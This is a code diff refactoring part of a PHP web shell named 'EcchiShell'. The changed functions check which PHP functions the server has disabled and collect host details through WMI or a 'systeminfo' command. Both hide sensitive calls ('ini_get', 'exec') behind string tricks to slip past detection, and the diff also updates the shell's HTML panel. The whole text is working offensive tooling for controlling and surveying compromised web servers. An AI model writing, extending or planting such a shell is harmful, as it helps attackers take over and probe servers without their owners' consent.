@@ -106,72 +106,92 @@ class EcchiShell
     {
         define("low", range("a", "z"));
         $in = low[8] . low[13] . low[8] . "_" . low[6] . low[4] . low[19];
-        if ($act = 'UI') {
-            return $in("disable_functions") == null ? 'Nothing' : $in("disable_functions");
+        if ($act == 'UI') {
+            return $in("disable_functions") ?: 'Nothing';
         } else {
             return $in("disable_functions");
         }
-    }
-
-    public function getOS()
-    {
-        if (substr(strtoupper(PHP_OS), 0, 3) == "WIN") {
-            return "Windows";
-        } else {
-            return "Linux";
-        }
+    
+        // return ($act === 'UI') ? ($in("disable_functions") ?? 'Nothing') : $in("disable_functions");
     }
 
     /**
-     * Summary of getInformationSytem
-     * @return float|string
+     * Summary of getOS
+     * @return string
      */
-    public function getInformationSytem()
+    public function getOS()
     {
-        $output = '';
+        return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? 'Windows' : 'Linux';
+    }
 
-        if ($this->getOS() === "Linux") {
-            $output = php_uname();
-        } else {
-            if (class_exists('COM')) {
-                $wmi = new COM('winmgmts://');
-                $os = $wmi->ExecQuery('SELECT * FROM Win32_OperatingSystem');
-                foreach ($os as $os_info) {
-                    $output .= 'Operating System: ' . $os_info->Caption . PHP_EOL;
-                    $output .= 'Kernel Type: ' . $os_info->OSArchitecture . PHP_EOL;
-                    $output .= 'Version: ' . $os_info->Version . PHP_EOL;
-                }
-            } else {
-                $result = [];
-                $getExecution = "exec";
-                $getExecution("systeminfo", $result);
-                if (!empty($getExecution)) {
-                    foreach ($result as $line) {
-                        if (strpos($line, 'OS Name:') !== false) {
-                            $os_name = trim(str_replace('OS Name:', '', $line));
-                            $output .= "<br>Operating System: " . $os_name . PHP_EOL;
-                        } elseif (strpos($line, 'System Type:') !== false) {
-                            $kernel_type = trim(str_replace('System Type:', '', $line));
-                            $output .= '<br>Kernel Type: ' . $kernel_type . PHP_EOL;
-                        } elseif (strpos($line, 'OS Version:') !== false) {
-                            $version = trim(str_replace('OS Version:', '', $line));
-                            $output .= '<br>Version: ' . $version . PHP_EOL;
-                        } else if (strpos($line, 'Host Name' !== false)) {
-                            $host_name = trim(str_replace('Host Name:', '', $line));
-                            $output .= '<br>User: ' . $host_name . PHP_EOL;
-                        } else if (strpos($line, 'BIOS Version:') !== false) {
-                            $bios = trim(str_replace('BIOS Version:', '', $line));
-                            $output .= '<br>Bios: ' . $bios . PHP_EOL;
-                            break;
-                        }
+    /**
+     * Summary of getInformationSystem
+     * @return string
+     */
+    public function getInformationSystem()
+    {
+        $information_system = '';
+        $os = $this->getOS();
+
+        switch ($os) {
+            case 'Linux':
+                $information_system = php_uname();
+                break;
+
+            default:
+                if (class_exists('COM')) {
+                    $wmi = new COM('winmgmts://');
+                    $os = $wmi->ExecQuery('SELECT * FROM Win32_OperatingSystem');
+                    foreach ($os as $os_info) {
+                        $information_system .= 'Operating System: ' . $os_info->Caption . PHP_EOL;
+                        $information_system .= 'Kernel Type: ' . $os_info->OSArchitecture . PHP_EOL;
+                        $version = explode(".", $os_info->Version);
+                        $information_system .= 'Version: ' . $version[0] . '.' . $version[1] . PHP_EOL;
                     }
                 } else {
-                    $output = "Can't Get Information System";
+                    $result = [];
+                    $exectution = "exec";
+                    $exectution('systeminfo', $result);
+                    if (!empty($result)) {
+                        foreach ($result as $line) {
+                            switch (true) {
+                                case (strpos($line, 'OS Name:') !== false):
+                                    $os_name = trim(str_replace('OS Name:', '', $line));
+                                    $information_system .= "<br>Operating System: " . $os_name . PHP_EOL;
+                                    break;
+
+                                case (strpos($line, 'System Type:') !== false):
+                                    $kernel_type = trim(str_replace('System Type:', '', $line));
+                                    $information_system .= '<br>Kernel Type: ' . $kernel_type . PHP_EOL;
+                                    break;
+
+                                case (strpos($line, 'Version:') !== false && strpos($line, 'BIOS Version:') === false):
+                                    $version = trim(str_replace('Version:', '', $line));
+                                    $information_system .= '<br>Version: ' . $version . PHP_EOL;
+                                    break;
+
+                                case (strpos($line, 'Host Name') !== false):
+                                    $host_name = trim(str_replace('Host Name:', '', $line));
+                                    $information_system .= '<br>User: ' . $host_name . PHP_EOL;
+                                    break;
+
+                                case (strpos($line, 'BIOS Version:') !== false):
+                                    $bios = trim(str_replace('BIOS Version:', '', $line));
+                                    $information_system .= '<br>Bios: ' . $bios . PHP_EOL;
+                                    break;
+
+                                default:
+                                    break;
+                            }
+                        }
+                    } else {
+                        $information_system = "Can't Get Information System";
+                    }
                 }
-            }
+                break;
         }
 
-        return $output;
+        return $information_system;
     }
 
     /**
@@ -373,7 +393,7 @@ $ecchishell = new EcchiShell;
                     <?= $ecchishell->getServerSoftware() ?>
                 </span></p>
             <p>Information System : <span>
-                    <?= $ecchishell->getInformationSytem() ?>
+                    <?= $ecchishell->getInformationSystem() ?>
                 </span></p>
         </div>
     </div>
